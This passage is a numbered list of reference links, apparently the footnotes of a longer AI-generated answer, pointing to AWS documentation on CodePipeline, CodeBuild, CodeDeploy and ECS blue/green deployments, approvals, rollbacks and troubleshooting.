[13]: https://docs.aws.amazon.com/codepipeline/latest/userguide/action-reference-CodeBuild.html?utm_source=chatgpt.com "AWS CodeBuild build and test action reference - AWS CodePipeline"
[14]: https://docs.aws.amazon.com/codebuild/latest/APIReference/API_ExportedEnvironmentVariable.html?utm_source=chatgpt.com "ExportedEnvironmentVariable - AWS CodeBuild"
[15]: https://docs.aws.amazon.com/codebuild/latest/userguide/batch-build.html?utm_source=chatgpt.com "Run builds in batches - AWS CodeBuild"
[16]: https://docs.aws.amazon.com/codepipeline/latest/userguide/concepts.html?utm_source=chatgpt.com "CodePipeline concepts - AWS CodePipeline"
[17]: https://docs.aws.amazon.com/codepipeline/latest/userguide/history.html?utm_source=chatgpt.com "AWS CodePipeline User Guide document history"
[18]: https://docs.aws.amazon.com/codepipeline/latest/userguide/execution-modes.html?utm_source=chatgpt.com "Set or change the pipeline execution mode - AWS CodePipeline"
[19]: https://docs.aws.amazon.com/codepipeline/latest/userguide/pipeline-requirements.html?utm_source=chatgpt.com "Pipeline declaration - AWS CodePipeline"
[20]: https://aws.amazon.com/blogs/devops/aws-codecommit-returns-to-general-availability/?utm_source=chatgpt.com "The Future of AWS CodeCommit"
[21]: https://docs.aws.amazon.com/codepipeline/latest/userguide/pipelines-triggers.html?utm_source=chatgpt.com "Automate starting pipelines using triggers and filtering"
[22]: https://docs.aws.amazon.com/codepipeline/latest/userguide/tutorials-github-tags.html?utm_source=chatgpt.com "Tutorial: Use Git tags to start your pipeline - AWS CodePipeline"
[23]: https://docs.aws.amazon.com/codepipeline/latest/userguide/pipelines-create-cross-account.html?utm_source=chatgpt.com "Create a pipeline in CodePipeline that uses resources from another AWS account - AWS CodePipeline"
[24]: https://docs.aws.amazon.com/codepipeline/latest/userguide/reference-variables.html?utm_source=chatgpt.com "Variables reference - AWS CodePipeline"
[25]: https://docs.aws.amazon.com/codepipeline/latest/userguide/approvals.html?utm_source=chatgpt.com "Add a manual approval action to a stage - AWS CodePipeline"
[26]: https://docs.aws.amazon.com/codepipeline/latest/userguide/approvals-iam-permissions.html?utm_source=chatgpt.com "Grant approval permissions to an IAM user in CodePipeline - AWS CodePipeline"
[27]: https://docs.aws.amazon.com/codepipeline/latest/userguide/stage-conditions.html?utm_source=chatgpt.com "Configure conditions for a stage - AWS CodePipeline"
[28]: https://docs.aws.amazon.com/codepipeline/latest/userguide/stage-rollback-manual.html?utm_source=chatgpt.com "Roll back a stage manually - AWS CodePipeline"
[29]: https://docs.aws.amazon.com/codedeploy/latest/userguide/deployments.html?utm_source=chatgpt.com "Working with deployments in CodeDeploy - AWS CodeDeploy"
[30]: https://docs.aws.amazon.com/AmazonECS/latest/developerguide/deployment-type-bluegreen.html?utm_source=chatgpt.com "CodeDeploy blue/green deployments for Amazon ECS - Amazon Elastic Container Service"
[31]: https://docs.aws.amazon.com/codedeploy/latest/userguide/deployment-steps-ecs.html?utm_source=chatgpt.com "Deployments on an Amazon ECS Compute Platform - AWS CodeDeploy"
[32]: https://docs.aws.amazon.com/codedeploy/latest/userguide/application-specification-files.html?utm_source=chatgpt.com "CodeDeploy application specification (AppSpec) files - AWS CodeDeploy"
[33]: https://docs.aws.amazon.com/codedeploy/latest/userguide/reference-appspec-file-structure-hooks.html?utm_source=chatgpt.com "AppSpec 'hooks' section - AWS CodeDeploy"
[34]: https://docs.aws.amazon.com/codedeploy/latest/userguide/tutorial-ecs-with-hooks-deployment.html?utm_source=chatgpt.com "Step 5: Use the CodeDeploy console to deploy your Amazon ECS service - AWS CodeDeploy"
[35]: https://docs.aws.amazon.com/codedeploy/latest/userguide/deployment-configurations.html?utm_source=chatgpt.com "Working with deployment configurations in CodeDeploy - AWS CodeDeploy"
[36]: https://docs.aws.amazon.com/codedeploy/latest/userguide/deployment-configurations-create.html?utm_source=chatgpt.com "Create a deployment configuration with CodeDeploy - AWS CodeDeploy"
[37]: https://docs.aws.amazon.com/codedeploy/latest/userguide/monitoring-create-alarms.html?utm_source=chatgpt.com "Monitoring deployments with CloudWatch alarms in CodeDeploy - AWS CodeDeploy"
[38]: https://docs.aws.amazon.com/codedeploy/latest/userguide/deployments-rollback-and-redeploy.html?utm_source=chatgpt.com "Redeploy and roll back a deployment with CodeDeploy - AWS CodeDeploy"
[39]: https://docs.aws.amazon.com/codepipeline/latest/userguide/file-reference.html?utm_source=chatgpt.com "Image definitions file reference - AWS CodePipeline"
[40]: https://docs.aws.amazon.com/codepipeline/latest/userguide/action-reference-ECSbluegreen.html?utm_source=chatgpt.com "Amazon Elastic Container Service and CodeDeploy blue- ..."
[41]: https://docs.aws.amazon.com/securityhub/latest/userguide/fsbp-standard.html?utm_source=chatgpt.com "AWS Foundational Security Best Practices standard in ..."
[42]: https://docs.aws.amazon.com/codebuild/latest/userguide/troubleshooting.html?utm_source=chatgpt.com "Troubleshooting AWS CodeBuild - AWS CodeBuild"
[43]: https://docs.aws.amazon.com/codebuild/latest/userguide/troubleshooting-vpc.html?utm_source=chatgpt.com "Troubleshoot your VPC setup - AWS CodeBuild"
[44]: https://docs.aws.amazon.com/codepipeline/latest/userguide/troubleshooting.html?utm_source=chatgpt.com "Troubleshooting CodePipeline - AWS Documentation"
[45]: https://docs.aws.amazon.com/codedeploy/latest/userguide/troubleshooting-ecs.html?utm_source=chatgpt.com "Troubleshoot Amazon ECS deployment issues - AWS CodeDeploy"
